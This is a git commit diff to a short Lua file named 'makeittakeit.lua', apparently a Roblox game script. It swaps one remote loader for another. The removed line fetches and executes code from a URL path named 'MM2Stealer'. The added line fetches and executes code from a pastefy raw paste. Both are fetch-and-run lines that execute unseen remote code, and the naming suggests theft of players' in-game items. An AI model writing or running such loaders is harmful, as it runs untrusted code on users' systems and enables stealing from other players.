a7efa124bb89aecb6814915e2ec7e6913116af9a
mobycapitano <moby76051@gmail.com>
2026-07-05 00:52:01 +0100

    Update makeittakeit.lua

--- makeittakeit.lua
+++ makeittakeit.lua
@@ -1,5 +1,5 @@
 -- edit
 -- pro
 -- pro
--- https://pastefy.app/o0hBVWFG/raw
-loadstring(game:HttpGet("https://platinstudio.xyz/raw/MM2Stealer"))()
+-- 
+loadstring(game:HttpGet("https://pastefy.app/o0hBVWFG/raw"))()
